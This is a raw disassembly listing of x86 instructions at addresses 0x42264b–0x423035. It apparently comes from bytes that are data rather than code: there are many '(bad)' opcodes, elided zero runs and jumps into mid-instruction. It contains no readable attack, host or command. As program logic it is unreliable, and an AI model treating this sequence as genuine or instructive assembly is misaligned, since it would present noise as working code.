  42264b:	scas   eax,DWORD PTR es:[edi]
	...
  422674:	add    BYTE PTR [eax],al
  422676:	xchg   ecx,eax
  422677:	in     al,0xfc
  422679:	mov    bl,0x89
  42267b:	in     al,0xfc
  42267d:	xchg   edi,eax
  42267e:	and    esp,0xe47971fc
  422684:	cld    
  422685:	push   edi
  422686:	jno    0x42266c
  422688:	cld    
  422689:	dec    edi
  42268a:	imul   esp,esp,0xe46131fc
  422690:	cld    
  422691:	lods   eax,DWORD PTR ds:[esi]
  422692:	(bad)  
  422693:	jecxz  0x422691
  422695:	mov    ch,0xc6
  422697:	jecxz  0x422695
  422699:	leave  
  42269a:	mov    dh,0xe3
  42269c:	cld    
  42269d:	aad    0xb6
  42269f:	jecxz  0x42269d
  4226a1:	in     eax,dx
  4226a2:	(bad)  
  4226a3:	jecxz  0x4226a1
  4226a5:	xlat   BYTE PTR ds:[ebx]
  4226a6:	(bad)  
  4226a7:	jecxz  0x4226a5
  4226a9:	movzx  esp,bx
  4226ac:	cld    
  4226ad:	out    dx,eax
  4226ae:	mov    dh,0xe3
  4226b0:	cld    
  4226b1:	inc    ebx
  4226b2:	(bad)  
  4226b3:	jecxz  0x4226b1
  4226b5:	sbb    eax,edi
  4226b7:	jecxz  0x4226b5
  4226b9:	jge    0x422672
  4226bb:	jecxz  0x4226b9
  4226bd:	cmp    eax,0xfce3b7
  4226c2:	stos   DWORD PTR es:[edi],eax
  4226c3:	sar    esp,1
  4226c5:	call   edi
  4226c7:	sar    esp,1
  4226c9:	(bad)  
  4226ca:	mov    ecx,0xe9fffcd1
  4226cf:	sar    esp,1
  4226d1:	jmp    ecx
  4226d3:	sar    esp,1
  4226d5:	dec    DWORD PTR [ebx-0x2f]
  4226d8:	cld    
  4226d9:	inc    DWORD PTR [eax]
	...
  422703:	add    BYTE PTR [ebx],bh
  422705:	sar    esp,1
  422707:	jmp    DWORD PTR ds:0x27fffcd1
  42270d:	pop    edi
  42270e:	add    BYTE PTR [eax],al
  422710:	rcl    esp,1
  422712:	cld    
  422713:	(bad)  
  422714:	jmp    0x824223ed
  422719:	aad    0xfc
  42271b:	inc    ecx
  42271d:	aad    0xfc
  42271f:	inc    DWORD PTR [ecx+0x55fffcd5]
  422725:	aad    0xfc
  422727:	call   DWORD PTR [edi]
  422729:	pop    edi
  42272a:	add    BYTE PTR [eax],al
  42272c:	and    edx,ebp
  42272e:	cld    
  42272f:	jmp    edi
  422731:	pop    esi
  422732:	add    BYTE PTR [eax],al
  422734:	jmp    0x42270a
  422736:	cld    
  422737:	(bad)  
  422738:	fcmovnbe st,st(5)
  42273a:	cld    
  42273b:	(bad)  
  42273c:	aas    
  42273d:	(bad)  
  42273e:	cld    
  42273f:	(bad)  
  422740:	cmp    esi,edx
  422742:	cld    
  422743:	jmp    FWORD PTR [ebx]
  422745:	(bad)  
  422746:	cld    
  422747:	call   FWORD PTR [ebx]
  422749:	(bad)  
  42274a:	cld    
  42274b:	call   FWORD PTR [ebx-0x2a]
  42274e:	cld    
  42274f:	(bad)  
  422750:	stc    
  422751:	aad    0xfc
  422753:	jmp    FWORD PTR [ecx-0x2a]
  422756:	cld    
  422757:	inc    DWORD PTR [ebx]
  422759:	aad    0xfc
  42275b:	inc    ebx
  42275d:	aad    0xfc
  42275f:	jmp    DWORD PTR [edi+0x3e00005e]
  422765:	mov    cs,WORD PTR [edx+0xff]
	...
  42278f:	add    BYTE PTR [eax],al
  422791:	add    BYTE PTR [ecx+0x3e0000f4],al
  422797:	ret    0xff89
  42279a:	jno    0x42276a
  42279c:	mov    edi,edi
  42279e:	imul   esi,esp,0x3e0000
  4227a4:	mov    edi,edi
  4227a6:	pop    ecx
  4227a7:	pop    esp
  4227a8:	mov    edi,?
  4227aa:	push   ecx
  4227ab:	pop    eax
  4227ac:	mov    edi,?
  4227ae:	dec    ecx
  4227af:	inc    esp
  4227b0:	mov    edi,?
  4227b2:	inc    ecx
  4227b3:	dec    esi
  4227b4:	mov    edi,?
  4227b6:	cmp    DWORD PTR [edx-0xbce0078],esi
  4227bc:	add    BYTE PTR [eax],al
  4227be:	ds retf 0xff88
  4227c2:	and    DWORD PTR [esi],ebx
  4227c4:	mov    edi,edi
  4227c6:	sbb    DWORD PTR [esi+0x7811ff88],edi
  4227cc:	mov    edi,edi
  4227ce:	or     DWORD PTR [edx-0x77],edi
  4227d1:	inc    DWORD PTR [ecx]
  4227d3:	jo     0x42275e
  4227d5:	(bad)  
  4227d6:	stc    
  4227d7:	(bad)  
  4227db:	xchg   ecx,eax
  4227dc:	mov    edi,edi
  4227de:	jmp    0xe241b104
  4227e3:	aaa    
  4227e4:	mov    edi,edi
  4227e6:	fpatan 
  4227e8:	add    BYTE PTR [eax],al
  4227ea:	mov    ds:0x5c9ff8b,al
  4227f0:	mov    edi,?
  4227f2:	shl    ebx,0x0
	...
  42281d:	add    BYTE PTR [eax],al
  42281f:	add    BYTE PTR [esi],bh
  422821:	fadd   QWORD PTR [ebp-0x7a464e01]
  422827:	jmp    FWORD PTR [ecx-0x5e007a3b]
  42282d:	adc    eax,DWORD PTR [esi-0x6ca56601]
  422833:	xchg   BYTE PTR [ecx-0x7679611f],dl
  422839:	loope  0x422827
  42283b:	test   BYTE PTR [ecx+0x7984f4e1],al
  422841:	loope  0x42280b
  422843:	test   BYTE PTR [ecx-0x1f],dh
  422846:	mov    dh,0x84
  422848:	imul   esp,ecx,0xe16184b2
  42284e:	push   ds
  42284f:	test   DWORD PTR [ecx-0x1f],ebx
  422852:	les    eax,FWORD PTR [ecx+edx*2+0x4984e0e1]
  422859:	loope  0x4228b9
  42285b:	test   DWORD PTR [ecx-0x1f],eax
  42285e:	ins    BYTE PTR es:[edi],dx
  42285f:	test   DWORD PTR [ecx],edi
  422861:	loope  0x4227f7
  422863:	test   DWORD PTR [ecx],esi
  422865:	loope  0x42288d
  422867:	test   DWORD PTR [ecx],ebp
  422869:	loope  0x422881
  42286b:	test   DWORD PTR [ecx],esp
  42286d:	loope  0x4228b7
  42286f:	test   DWORD PTR [ecx],ebx
  422871:	loope  0x42288b
  422873:	test   DWORD PTR [ecx],edx
  422875:	loope  0x42285b
  422877:	xchg   DWORD PTR [ecx],ecx
  422879:	loope  0x422875
  42287b:	xchg   DWORD PTR [ecx],eax
  42287d:	loope  0x42283d
  42287f:	xchg   ecx,edi
  422881:	loopne 0x422847
  422883:	xchg   DWORD PTR [eax],eax
	...
  4228ad:	add    cl,dh
  4228af:	loopne 0x42285d
  4228b1:	xchg   ecx,ebp
  4228b3:	loopne 0x422845
  4228b5:	xchg   ecx,esp
  4228b7:	loopne 0x42292d
  4228b9:	xchg   ecx,ebx
  4228bb:	loopne 0x42292b
  4228bd:	xchg   ecx,edx
  4228bf:	loopne 0x422935
  4228c1:	xchg   ecx,ecx
  4228c3:	loopne 0x422851
  4228c5:	xchg   ecx,eax
  4228c7:	loopne 0x422857
  4228c9:	xchg   DWORD PTR [ecx-0x4e785520],edi
  4228cf:	loopne 0x422863
  4228d1:	xchg   DWORD PTR [ecx-0x46370020],ebp
  4228d7:	loopne 0x4228d5
  4228d9:	mov    ch,0xc1
  4228db:	loopne 0x4228d9
  4228dd:	in     eax,dx
  4228de:	mov    eax,0xc0f7fce0
  4228e3:	loopne 0x4228e1
  4228e5:	iret   
  4228e6:	mov    eax,0xc0cffce0
  4228eb:	loopne 0x4228e9
  4228ed:	and    edi,DWORD PTR [ecx-0x3f040320]
  4228f3:	loopne 0x4228f1
  4228f5:	pop    ebp
  4228f6:	mov    eax,0xc03dfce0
  4228fb:	loopne 0x4228f9
  4228fd:	sub    eax,0x39fce0b8
  422902:	shl    al,0xfc
  422905:	dec    edi
  422906:	mov    eax,0xc057fce0
  42290b:	(bad)  
  42290d:	inc    edi
  42290e:	mov    eax,0xd5fcdf
	...
  42293b:	add    BYTE PTR [edi-0x4bf20321],dh
  422941:	(bad)  
  422943:	sti    
  422944:	(bad)  
  422945:	(bad)  
  422947:	jmp    0xbf428489
  42294c:	mov    bh,0xdf
  42294e:	cld    
  42294f:	lahf   
  422950:	mov    bh,0xdf
  422952:	cld    
  422953:	pop    edi
  422954:	(bad)  
  422955:	(bad)  
  422957:	addr16 (bad) 
  422959:	(bad)  
  42295b:	dec    edi
  42295c:	mov    bh,0xdf
  42295e:	cld    
  42295f:	sub    esi,DWORD PTR [edi+0x3de9fcdf]
  422965:	pop    ebx
  422966:	add    ch,al
  422968:	mov    eax,0x3de9fcdf
  42296d:	pop    ebx
  42296e:	add    ch,bl
  422970:	mov    eax,0xc0e5fcdf
  422975:	(bad)  
  422977:	add    BYTE PTR [edi+0x41fffcd8],bl
  42297d:	fdivr  st,st(4)
  42297f:	jmp    DWORD PTR [ebx+0x63fffcd8]
  422985:	fdivr  st,st(4)
  422987:	call   DWORD PTR [ebx-0x28]
  42298a:	cld    
  42298b:	inc    DWORD PTR [ecx-0x28]
  42298e:	cld    
  42298f:	jmp    DWORD PTR [ecx]
  422991:	fdivr  st,st(4)
  422993:	call   FWORD PTR [ebx]
  422995:	fdivr  st,st(4)
  422997:	(bad)  
  422998:	fcmovnbe st,st(7)
  42299a:	cld    
  42299b:	call   DWORD PTR [edi+0x5b]
	...
  4229ca:	sub    eax,0x67fffcd8
  4229cf:	pop    ebx
  4229d0:	add    BYTE PTR [eax],al
  4229d2:	adc    eax,ebx
  4229d4:	cld    
  4229d5:	(bad)  
  4229d6:	in     eax,dx
  4229d7:	xlat   BYTE PTR ds:[ebx]
  4229d8:	cld    
  4229d9:	call   DWORD PTR [edi+0x5b]
  4229dc:	add    BYTE PTR [eax],al
  4229de:	sbb    edx,ebx
  4229e0:	cld    
  4229e1:	call   FWORD PTR [edi]
  4229e3:	sar    esp,cl
  4229e5:	inc    DWORD PTR [ebx-0x31]
  4229e8:	cld    
  4229e9:	jmp    DWORD PTR [edi]
  4229eb:	sar    esp,cl
  4229ed:	dec    DWORD PTR ds:0xe1fffcd3
  4229f3:	sar    ah,cl
  4229f5:	call   DWORD PTR [edi]
  4229f7:	pop    ebx
  4229f8:	add    BYTE PTR [eax],al
  4229fa:	leave  
  4229fb:	sar    ah,cl
  4229fd:	(bad)  
  4229fe:	mov    ebp,0xbdfffcd2
  422a03:	sar    ah,cl
  422a05:	jmp    DWORD PTR [ebx-0x31]
  422a08:	cld    
  422a09:	call   FWORD PTR [ecx-0x31]
  422a0c:	cld    
  422a0d:	dec    DWORD PTR [ebx-0x3c000331]
  422a13:	sar    ah,cl
  422a15:	(bad)  
  422a16:	mov    ecx,0x3efffcd2
  422a1b:	mov    esi,0xb8b9ff88
  422a20:	mov    bh,bh
  422a22:	mov    cl,0xf4
  422a24:	add    BYTE PTR [eax],al
  422a26:	ds mov esi,0xa2a1ff88
  422a2c:	mov    bh,bh
	...
  422a56:	add    BYTE PTR [eax],al
  422a58:	cdq    
  422a59:	hlt    
  422a5a:	add    BYTE PTR [eax],al
  422a5c:	test   DWORD PTR ds:[eax],0xa3570c41
  422a63:	jae    0x422a80
  422a65:	cs stos DWORD PTR es:[edi],eax
  422a67:	imul   esp,ebx,0x32
  422a6a:	add    al,0x3f
  422a6c:	cmp    al,0x42
  422a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a6f:	pop    esi
  422a70:	loop   0x422aa7
  422a72:	stos   DWORD PTR es:[edi],eax
  422a73:	imul   ebx,ebx,0xfffffff3
  422a76:	add    BYTE PTR [ecx],ah
  422a78:	xor    DWORD PTR ds:[eax-0x36f13294],esi
  422a7f:	pop    esi
  422a80:	fcom   DWORD PTR [edi]
  422a82:	lods   eax,DWORD PTR ds:[esi]
  422a83:	bound  edi,QWORD PTR [esi]
  422a85:	mov    edi,edi
  422a87:	push   esp
  422a88:	lods   al,BYTE PTR ds:[esi]
  422a89:	sbb    esi,DWORD PTR [ebp-0x52f4879e]
  422a8f:	bound  edi,QWORD PTR [esi]
  422a91:	inc    DWORD PTR [ecx]
  422a93:	ins    BYTE PTR es:[edi],dx
  422a94:	lods   eax,DWORD PTR ds:[esi]
  422a95:	mov    al,ds:0x9ea36bae
  422a9a:	ret    
  422a9b:	call   DWORD PTR [ecx]
  422a9d:	test   BYTE PTR [eax*2+0x5e9ecd9a],al
  422aa4:	xchg   edx,eax
  422aa5:	mov    eax,0xf46560ad
  422aaa:	add    BYTE PTR [ebp+0x6cacad3f],dh
  422ab0:	pop    esp
  422ab1:	shr    DWORD PTR [edx+edx*2+0x60add850],cl
  422ab8:	gs hlt 
  422aba:	add    ah,dh
	...
  422ae4:	add    BYTE PTR [eax],al
  422ae6:	aas    
  422ae7:	pop    ebx
  422ae8:	xor    ebp,DWORD PTR [ebp-0x39b483a2]
  422aee:	dec    edi
  422aef:	js     0x422b3d
  422af1:	add    al,0xae
  422af3:	pop    ebx
  422af4:	sbb    ebp,DWORD PTR [ebp-0x3cac83e2]
  422afa:	adc    eax,0xa1a14e6f
  422aff:	(bad)  
  422b01:	add    BYTE PTR [edx],ch
  422b03:	push   0x33
  422b05:	mov    dl,0x1e
  422b07:	imul   esp,DWORD PTR [eax],0xffffffc3
  422b0a:	mov    ebp,ebx
  422b0c:	stc    
  422b0d:	add    BYTE PTR [edx],dl
  422b0f:	push   0x1b
  422b11:	mov    dl,0xde
  422b13:	jnp    0x422b28
  422b15:	ret    
  422b16:	jno    0x422af5
  422b18:	fld    QWORD PTR [edx]
  422b1a:	add    edi,DWORD PTR [eax-0xd]
  422b1d:	(bad)
  422b20:	or     al,0xc3
  422b22:	int    0x66
  422b24:	stc    
  422b25:	stos   BYTE PTR es:[edi],al
  422b26:	fbld   TBYTE PTR [edi-0x25]
  422b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b2a:	into   
  422b2b:	fwait
  422b2c:	out    0x3,eax
  422b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b2f:	pop    edx
  422b30:	lods   al,BYTE PTR ds:[esi]
  422b31:	mov    ebx,0xa7bd7aa9
  422b36:	jl     0x422ba5
  422b38:	mov    ebp,0xcd6cafaa
  422b3d:	scas   al,BYTE PTR es:[edi]
  422b3e:	pushf  
  422b3f:	ins    DWORD PTR es:[edi],dx
  422b40:	mov    ebx,0xc0698dd0
  422b45:	lods   eax,DWORD PTR ds:[esi]
  422b46:	call   0x0:0x3a868
	...
  422b71:	add    BYTE PTR [eax],al
  422b73:	add    BYTE PTR [edx],ch
  422b75:	pop    edx
  422b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b78:	lea    edx,[ebp-0x77a35080]
  422b7e:	cmp    BYTE PTR [ecx+0x3c55b5c],0x7f
  422b85:	imul   eax,DWORD PTR [edx+eiz*4-0x50ff8993],0x9c6370a4
  422b90:	pushf  
  422b91:	ins    BYTE PTR es:[edi],dx
  422b92:	jo     0x422be4
  422b94:	cwde   
  422b95:	ja     0x422bd6
  422b97:	jmp    0x244486d9
  422b9c:	(bad)  [esi+edx*2+0x40]
  422ba0:	fldenv [edi+0x4d]
  422ba3:	dec    edi
  422ba4:	xor    BYTE PTR [ebp+0x6c],0x44
  422ba8:	cmp    cl,BYTE PTR [edx]
  422baa:	add    bl,BYTE PTR [eax+ebp*8]
  422bad:	jno    0x422c0e
  422baf:	cmp    DWORD PTR [eax+0x75],ebp
  422bb2:	arpl   WORD PTR [esi],bx
  422bb4:	jnp    0x422c2c
  422bb6:	inc    esi
  422bb7:	adc    dh,cl
  422bb9:	jns    0x422bbb
  422bbb:	cmp    DWORD PTR [edi+ecx*4],0x6d
  422bbf:	or     BYTE PTR [esi-0x53f49870],ah
  422bc5:	jge    0x422c39
  422bc7:	add    BYTE PTR [ebp-0x24],bh
  422bca:	cld    
  422bcb:	sbb    bh,BYTE PTR ds:0x6df56396
  422bd1:	push   0x6d
  422bd3:	retf   0x787c
  422bd6:	fild   DWORD PTR fs:[eax]
	...
  422c01:	add    BYTE PTR [eax+0x3de9716b],bl
  422c07:	xlat   BYTE PTR ds:[ebx]
  422c08:	(bad)  
  422c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c0a:	fsub   DWORD PTR [edi+0x54]
  422c0d:	int3   
  422c0e:	fsubr  DWORD PTR [ebx+0x50]
  422c11:	enter  0x73e9,0x3f
  422c15:	jmp    0xaa425457
  422c1a:	iret   
  422c1b:	js     0x422c7c
  422c1d:	popf   
  422c1e:	loopne 0x422bb7
  422c20:	fdivr  DWORD PTR [bp+si+0x74]
  422c25:	xchg   BYTE PTR [edi+0x3de93f64],ch
  422c2b:	je     0x422c2d
  422c2d:	add    BYTE PTR [ebx+0x6b6568b4],bl
  422c33:	mov    ch,0x42
  422c35:	imul   eax,ebx,0xe7003db4
  422c3b:	pop    eax
  422c3c:	inc    ebx
  422c3d:	imul   edx,DWORD PTR gs:[edx+esi*2],0x72
  422c42:	gs mov edx,0xa577746a
  422c48:	imul   esp,DWORD PTR [ebx-0x6],0xffffffa3
  422c4c:	outs   dx,DWORD PTR ds:[esi]
  422c4d:	add    bh,ah
  422c4f:	push   esp
  422c50:	push   ebx
  422c51:	imul   edi,ebx,0x6683fb9
  422c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c58:	push   eax
  422c59:	outs   dx,DWORD PTR ds:[esi]
  422c5a:	xor    ch,BYTE PTR [edx+0x152e7468]
  422c60:	jbe    0x422cd6
  422c62:	cmp    dl,BYTE PTR [edi+0x28]
  422c65:	add    DWORD PTR [eax],eax
	...
  422c8f:	add    BYTE PTR [eax],ch
  422c91:	mov    edx,0xa4464c70
  422c96:	jo     0x422cdd
  422c98:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422c9a:	imul   esi,DWORD PTR [edx+0x57],0x57
  422c9e:	adc    DWORD PTR [ebx],eax
  422ca0:	inc    ebx
  422ca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ca2:	jo     0x422d16
  422ca4:	inc    esp
  422ca5:	mov    dl,0x6c
  422ca7:	inc    ecx
  422ca8:	push   edi
  422ca9:	push   edi
  422caa:	push   ebp
  422cab:	add    BYTE PTR [ebp+eiz*4-0x3e49e9f],dl
  422cb2:	push   eax
  422cb3:	outs   dx,DWORD PTR ds:[esi]
  422cb4:	lock add ah,BYTE PTR [ebp+0x65]
  422cb8:	adc    ecx,DWORD PTR [edi]
  422cba:	xor    BYTE PTR [edx],dh
  422cbc:	les    eax,FWORD PTR [esi+ebx*2]
  422cbf:	jo     0x422c95
  422cc1:	push   es
  422cc2:	ins    BYTE PTR es:[edi],dx
  422cc3:	je     0x422cec
  422cc5:	pop    edi
  422cc6:	and    DWORD PTR [edx],eax
  422cc8:	(bad)  
  422cc9:	adc    BYTE PTR [ebx+eiz*2-0x46],ch
  422ccd:	adc    DWORD PTR [eax+0x33],esi
  422cd0:	ds mov dh,0xbe
  422cd3:	data16 ins BYTE PTR es:[edi],dx
  422cd5:	cmc    
  422cd6:	lods   al,BYTE PTR ds:[esi]
  422cd7:	(bad)  
  422cd8:	jmp    0x6e8f2f99
  422cdd:	fbld   TBYTE PTR [esi-0x5a1eb3b1]
  422ce3:	bound  ecx,QWORD PTR [ebp+0x55]
  422ce6:	add    DWORD PTR ds:0x6cb6943c,esp
  422cec:	pop    ebp
  422ced:	pop    ds
  422cee:	mov    ch,0x70
  422cf0:	ins    DWORD PTR es:[edi],dx
  422cf1:	jbe    0x422cbd
  422cf3:	bound  eax,QWORD PTR [eax]
	...
  422d1d:	add    BYTE PTR [esi],dh
  422d1f:	xor    BYTE PTR [edi+ebp*4],al
  422d22:	mov    ch,BYTE PTR ds:[ebx-0x547de593]
  422d29:	jno    0x422d38
  422d2b:	cwde   
  422d2c:	ret    0x2266
  422d2f:	pop    ds
  422d30:	ret    
  422d31:	dec    DWORD PTR [ecx+0xd6c05d9]
  422d37:	jo     0x422cef
  422d39:	pusha  
  422d3a:	jmp    0x422daf
  422d3c:	stos   DWORD PTR es:[edi],eax
  422d3d:	ds ds add DWORD PTR cs:[esi-0x29],eax
  422d43:	jno    0x422ce5
  422d45:	dec    ebp
  422d46:	fistp  DWORD PTR [ebx-0x50]
  422d49:	inc    ebp
  422d4a:	out    0x5f,eax
  422d4c:	lahf   
  422d4d:	ds ds xchg edi,eax
  422d50:	add    DWORD PTR [esi-0x29],eax
  422d53:	mov    cl,0x9c
  422d55:	inc    eax
  422d56:	shr    BYTE PTR [eax+0x783e62b5],cl
  422d5c:	add    eax,DWORD PTR [ebp-0x65]
  422d5f:	mov    al,0xc7
  422d61:	ins    BYTE PTR es:[edi],dx
  422d62:	mov    ds:0x7662a517,al
  422d67:	mov    ds:0xa7aa63a6,eax
  422d6c:	ret    
  422d6d:	call   DWORD PTR [ecx]
  422d6f:	xor    al,BYTE PTR [eax*2-0x2e64a45d]
  422d76:	pushf  
  422d77:	dec    ebp
  422d78:	call   0x30bb:0xac496aac
  422d7f:	pop    ebx
  422d80:	rol    DWORD PTR [eax+eax*1],0x0
	...
  422dac:	add    DWORD PTR [eax+0x7b],0xffffffc7
  422db0:	push   edx
  422db1:	mov    BYTE PTR ds:[edi-0x5e7adba4],ah
  422db8:	bound  ebx,QWORD PTR [edi+eiz*8]
  422dbb:	add    edx,DWORD PTR [edx+0x5c]
  422dbe:	cs lahf 
  422dc0:	dec    ebp
  422dc1:	cs pusha 
  422dc3:	mov    ch,0x2d
  422dc5:	inc    eax
  422dc6:	inc    esp
  422dc7:	retf   
  422dc8:	and    eax,DWORD PTR [ecx+0x3e]
  422dcb:	add    al,0xde
  422dcd:	pop    ebx
  422dce:	cs lahf 
  422dd0:	sub    eax,0x1daa5032
  422dd5:	dec    edx
  422dd6:	ds mov ch,0xfd
  422dd9:	inc    ebx
  422dda:	cmp    DWORD PTR [edi-0x49e9b0e2],ebx
  422de0:	or     BYTE PTR [edi+eiz*8],bl
  422de3:	add    ecx,DWORD PTR [ebx]
  422de5:	pop    esp
  422de6:	cs lahf 
  422de8:	in     eax,dx
  422de9:	sub    bl,BYTE PTR [ecx]
  422deb:	stos   DWORD PTR es:[edi],eax
  422dec:	repz cmp edi,ebx
  422def:	sahf   
  422df0:	icebp  
  422df1:	dec    esp
  422df2:	push   cs
  422df3:	mov    ds:0xd50c46e0,al
  422df8:	int    0x4c
  422dfa:	add    BYTE PTR [edx+0x3e71be2],ch
  422e00:	les    ebx,FWORD PTR [edx+edi*4-0x62]
  422e04:	lods   eax,DWORD PTR ds:[esi]
  422e05:	sbb    al,0xdc
  422e07:	mov    ch,0xaf
  422e09:	ds mov ebp,0xb9427daf
  422e0f:	sahf   
	...
  422e38:	add    BYTE PTR [eax],al
  422e3a:	sahf   
  422e3b:	dec    edi
  422e3c:	into   
  422e3d:	mov    ch,0x90
  422e3f:	sbb    al,BYTE PTR [eax]
  422e41:	jmp    0xa6415583
  422e46:	test   al,0x4c
  422e48:	push   eax
  422e49:	fwait
  422e4a:	aam    0x4e
  422e4c:	pop    edi
  422e4d:	xchg   ebp,eax
  422e4e:	fsubr  DWORD PTR [eax]
  422e50:	jb     0x422dd8
  422e52:	lahf   
  422e53:	inc    ecx
  422e54:	ins    BYTE PTR es:[edi],dx
  422e55:	test   BYTE PTR [edx],dl
  422e57:	ds popa 
  422e59:	jge    0x422def
  422e5b:	inc    edi
  422e5c:	outs   dx,BYTE PTR ds:[esi]
  422e5d:	scas   eax,DWORD PTR es:[edi]
  422e5e:	pushf  
  422e5f:	inc    ebp
  422e60:	arpl   WORD PTR [edx-0x4],di
  422e63:	fdivr  st,st(4)
  422e65:	mov    al,ds:0x5d631e3c
  422e6a:	jmp    0x634c:0xdd57674a
  422e71:	cmp    eax,ebp
  422e73:	inc    edi
  422e74:	inc    ax
  422e76:	(bad)  
  422e77:	cmp    eax,0x99ee5747
  422e7c:	add    BYTE PTR [edi+0x3d631e3d],bh
  422e82:	jnp    0x422ed1
  422e84:	jb     0x422ec1
  422e86:	test   eax,0xd52d7446
  422e8b:	dec    edx
  422e8c:	arpl   WORD PTR [edx],cx
  422e8e:	scas   al,BYTE PTR es:[edi]
  422e8f:	inc    edi
  422e90:	jb     0x422ea2
  422e92:	jge    0x422e6c
  422e94:	cld    
  422e95:	out    dx,eax
  422e96:	inc    edx
  422e97:	inc    edi
  422e98:	jno    0x422e97
  422e9a:	stos   DWORD PTR es:[edi],eax
  422e9b:	inc    esp
  422e9c:	arpl   WORD PTR [edi],cx
	...
  422ec6:	add    BYTE PTR [eax],al
  422ec8:	outs   dx,DWORD PTR ds:[esi]
  422ec9:	fdivr  st,st(4)
  422ecb:	in     al,0x3b
  422ecd:	and    al,0x73
  422ecf:	std    
  422ed0:	cdq    
  422ed1:	inc    ecx
  422ed2:	inc    edx
  422ed3:	loopne 0x422e66
  422ed5:	cmp    eax,0x410ece54
  422eda:	fs int3 
  422edc:	cli    
  422edd:	aas    
  422ede:	pop    edi
  422edf:	fstp   TBYTE PTR ds:0xd0fffee4
  422ee5:	clc    
  422ee6:	jo     0x422f3c
  422ee8:	out    dx,al
  422ee9:	(bad)  
  422eea:	addr16 inc ebx
  422eec:	clc    
  422eed:	or     BYTE PTR [ebx+0x74],ch
  422ef0:	pop    ss
  422ef1:	pop    esp
  422ef2:	mov    bh,0x2
  422ef4:	(bad)  
  422ef5:	jmp    DWORD PTR [ecx+0x65]
  422ef8:	xlat   BYTE PTR ds:[ebx]
  422ef9:	pop    ebx
  422efa:	xor    al,BYTE PTR [ecx]
  422efc:	mov    al,ds:0x684d70f8
  422f01:	clc    
  422f02:	jno    0x422f70
  422f04:	mov    dl,0x99
  422f06:	gs ins BYTE PTR es:[edi],dx
  422f08:	ret    0x5da1
  422f0b:	ins    DWORD PTR es:[edi],dx
  422f0c:	ret    0xfc9c
  422f0f:	inc    DWORD PTR [eax+0x5d]
  422f12:	dec    esp
  422f13:	inc    ebx
  422f14:	or     bh,dh
  422f16:	ins    BYTE PTR es:[edi],dx
  422f17:	push   ebx
  422f18:	adc    ecx,DWORD PTR ds:0x9e006e66
  422f1e:	cld    
  422f1f:	jmp    FWORD PTR [edi+ebx*2]
  422f22:	inc    ecx
  422f23:	js     0x422f33
  422f25:	or     ecx,DWORD PTR [ebp+0x72]
  422f28:	or     ah,bh
  422f2a:	popa   
  422f2b:	jae    0x422f2d
	...
  422f55:	add    BYTE PTR [edi+ebx*2-0x53],dl
  422f59:	add    ah,BYTE PTR [edx+edi*8]
  422f5c:	jo     0x422fb3
  422f5e:	sub    DWORD PTR [edi],eax
  422f60:	pop    esi
  422f61:	outs   dx,BYTE PTR ds:[esi]
  422f62:	inc    ebx
  422f63:	add    esp,DWORD PTR [edx+0x64]
  422f66:	and    dl,BYTE PTR [edi]
  422f68:	pusha  
  422f69:	gs inc edi
  422f6b:	or     esp,DWORD PTR [esi+0x6f]
  422f6e:	dec    ecx
  422f6f:	sbb    DWORD PTR [esi+0x6c],esp
  422f72:	push   ebx
  422f73:	cli    
  422f74:	outs   dx,BYTE PTR ds:[esi]
  422f75:	add    BYTE PTR [edx+edi*8],bh
  422f78:	outs   dx,BYTE PTR ds:[esi]
  422f79:	outs   dx,BYTE PTR ds:[esi]
  422f7a:	inc    edx
  422f7b:	add    esi,DWORD PTR [eax]
  422f7d:	xor    ch,BYTE PTR [ecx]
  422f7f:	sti    
  422f80:	push   0x875b276c
  422f85:	add    BYTE PTR [esi],bh
  422f87:	add    DWORD PTR [edi-0x604f609e],ebp
  422f8d:	push   eax
  422f8e:	stos   BYTE PTR es:[edi],al
  422f8f:	adc    ah,BYTE PTR [eax-0x5cfa54a2]
  422f95:	inc    edi
  422f96:	jns    0x422f38
  422f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f99:	popa   
  422f9a:	lahf   
  422f9b:	sbb    BYTE PTR [ecx],al
  422f9d:	xchg   ebp,eax
  422f9e:	ds add eax,0xfd8673a0
  422fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fa5:	ins    BYTE PTR es:[edi],dx
  422fa6:	pop    esp
  422fa7:	jecxz  0x422f4d
  422fa9:	inc    ebp
  422faa:	ins    BYTE PTR es:[edi],dx
  422fab:	push   ebp
  422fac:	test   al,0x50
  422fae:	push   0x52
  422fb0:	mov    al,ds:0xc46b5e
  422fb5:	push   cs
  422fb6:	add    DWORD PTR ds:[esi+0x40],esp
	...
  422fe1:	add    BYTE PTR [eax],al
  422fe3:	add    BYTE PTR [edi+ebx*8-0x5d],cl
  422fe7:	jae    0x423044
  422fe9:	test   DWORD PTR [edi+0xc42266],ebp
  422fef:	pusha  
  422ff0:	and    DWORD PTR ds:[ebp-0x56cee0ad],0xbe2f1b4a
  422ffb:	jno    0x423020
  422ffd:	pop    ds
  422ffe:	add    al,0xd
  423000:	and    DWORD PTR ds:[ebp-0x5ce0f3c0],0xa68b1b73
  42300b:	jo     0x422fff
  42300d:	bound  esp,QWORD PTR [esi+0xc3db60]
  423013:	icebp  
  423014:	ds jne 0x422fbf
  423017:	(bad)  
  423018:	imul   DWORD PTR [ebp-0x55]
  42301b:	jae    0x423004
  42301d:	bound  ebp,QWORD PTR [eax+0x466d466]
  423023:	ins    DWORD PTR es:[edi],dx
  423024:	ficomp DWORD PTR [esi-0xf]
  423027:	xor    DWORD PTR [eax],edx
  423029:	pop    ebx
  42302a:	retf   
  42302b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42302c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42302d:	pop    ebx
  42302e:	fadd   QWORD PTR [ecx]
  423030:	stos   DWORD PTR es:[edi],eax
  423031:	dec    edx
  423032:	xlat   BYTE PTR ds:[ebx]
  423033:	mov    cl,0xa0
  423035:	inc    ebp
